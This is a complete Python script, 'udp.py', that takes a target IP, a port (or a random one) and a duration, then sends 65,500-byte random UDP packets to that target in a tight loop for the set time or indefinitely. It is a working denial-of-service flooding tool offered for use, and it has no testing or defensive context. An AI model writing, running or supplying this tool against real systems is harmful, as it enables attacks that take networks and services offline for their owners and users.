#!/usr/bin/env python3
import socket
import random
import sys
import time

def validate_args():
    if len(sys.argv) != 4:
        sys.exit('Usage: udp.py <ip> <port(0=random)> <length(0=forever)>')

def get_duration(dur):
    if dur > 0:
        return time.time() + dur
    return None

def UDPFlood(ip, port, dur):
    randport = (port == 0)
    end_time = get_duration(dur)
    
    print(f'Starting UDP flood on {ip}:{port} for {"infinite" if dur == 0 else dur} seconds')
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(65500)

    while True:
        target_port = random.randint(1, 65535) if randport else port
        
        sock.sendto(payload, (ip, target_port))
        
        # Check if duration has passed
        if end_time and time.time() >= end_time:
            print('Duration reached, stopping...')
            break
            
    print('Flood completed successfully!')

if __name__ == "__main__":
    validate_args()
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    target_duration = int(sys.argv[3])
    
    UDPFlood(target_ip, target_port, target_duration)

